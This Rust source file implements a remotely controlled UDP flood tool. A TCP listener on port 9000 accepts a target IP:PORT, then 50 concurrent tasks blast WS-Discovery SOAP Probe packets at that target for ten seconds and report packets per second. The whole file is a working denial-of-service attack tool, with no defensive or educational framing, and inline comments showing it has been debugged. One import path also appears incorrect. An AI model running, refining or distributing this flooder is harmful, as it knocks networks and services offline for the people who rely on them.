use tokio::net::{TcpListener, TcpStream, UdpSocket};
use tokio::io::{AsyncBufReadExt, BufReader, AsyncWriteExt};
use tokio::{sleep, time::Duration};
use std::sync::atomic::{AtomicU64, Ordering};
use std::sync::Arc;
use anyhow::Result;

const THREADS: usize = 50;
const BURST_SIZE: usize = 5;
const DURATION_SECONDS: u64 = 10;
const CONTROL_PORT: u16 = 9000;

fn build_payload() -> Vec<u8> {
    let payload = br#"<?xml version="1.0" encoding="UTF-8"?>
<e:Envelope xmlns:e="http://www.w3.org/2003/05/soap-envelope"
            xmlns:w="http://schemas.xmlsoap.org/ws/2004/08/addressing"
            xmlns:d="http://schemas.xmlsoap.org/ws/2005/04/discovery">
  <e:Header>
    <w:MessageID>urn:uuid:STATIC-UUID-1234</w:MessageID>
    <w:To>urn:schemas-xmlsoap-org:ws:2005/04/discovery</w:To>
    <w:Action>http://schemas.xmlsoap.org/ws/2005/04/discovery/Probe</w:Action>
  </e:Header>
  <e:Body>
    <d:Probe>
      <d:Types>dn:NetworkVideoTransmitter</d:Types>
    </d:Probe>
  </e:Body>
</e:Envelope>"#;
    payload.to_vec()
}

async fn handle_flood(target: String, packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) -> Result<()> {
    let socket = UdpSocket::bind("0.0.0.0:0").await?;
    // Corrected function name casing
    let payload = build_payload();

    while running.load(Ordering::Relaxed) == 1 {
        // Corrected loop syntax and constant name
        for _ in 0..BURST_SIZE {
            // Handled the result of send_to, propagating errors with '?'
            socket.send_to(&payload, &target).await?;
            packet_count.fetch_add(1, Ordering::Relaxed);
        }
    }
    Ok(())
}

async fn pps_monitor(packet_count: Arc<AtomicU64>, running: Arc<AtomicU64>) {
    let mut last_count = 0;
    while running.load(Ordering::Relaxed) == 1 {
        sleep(Duration::from_secs(1)).await;
        let current = packet_count.load(Ordering::Relaxed);
        println!("PPS: {}", current - last_count);
        last_count = current;
    }
}

async fn handle_client(mut stream: TcpStream) -> Result<()> {
    let (reader, mut writer) = stream.split();
    let reader = BufReader::new(reader);
    let mut lines = reader.lines();

    writer.write_all(b"Enter target IP:PORT\n").await?;

    while let Ok(Some(line)) = lines.next_line().await {
        if let Some((ip, port_str)) = line.trim().split_once(':') {
            if let Ok(port) = port_str.parse::<u16>() {
                let target = format!("{}:{}", ip, port);
                println!("Received target: {}", target);
                writer.write_all(format!("Flooding target: {}\n", target).as_bytes()).await?;

                let packet_count = Arc::new(AtomicU64::new(0));
                let running = Arc::new(AtomicU64::new(1));

                let monitor_handle = {
                    let pc = Arc::clone(&packet_count);
                    let run = Arc::clone(&running);
                    tokio::spawn(pps_monitor(pc, run))
                };

                // Corrected vector name to match its usage
                let mut flood_tasks = vec![];
                // Corrected loop syntax
                for _ in 0..THREADS {
                    let pc = Arc::clone(&packet_count);
                    let run = Arc::clone(&running);
                    let tgt = target.clone();
                    flood_tasks.push(tokio::spawn(handle_flood(tgt, pc, run)));
                }

                sleep(Duration::from_secs(DURATION_SECONDS)).await;
                running.store(0, Ordering::Relaxed);

                for task in flood_tasks {
                    // Awaited the task and handled potential join/task errors
                    task.await??;
                }
                let _ = monitor_handle.await;

                println!("Stopped for target: {}", target);
                writer.write_all(format!("Stopped flood for target: {}\n", target).as_bytes()).await?;

            } else {
                 writer.write_all(b"Invalid port number.\n").await?;
            }
        } else {
            writer.write_all(b"Invalid format. Use IP:PORT.\n").await?;
        }
    }
    Ok(())
}

#[tokio::main]
async fn main() -> Result<()> {
    let listener = TcpListener::bind(("0.0.0.0", CONTROL_PORT)).await?;
    // Corrected constant name
    println!("TCP control server listening on port {}", CONTROL_PORT);

    loop {
        // Corrected tuple destructuring: listener.accept() returns two values.
        let (stream, _) = listener.accept().await?;
        tokio::spawn(async move {
            if let Err(e) = handle_client(stream).await {
                eprintln!("Error handling client: {}", e);
            }
        });
    }
}
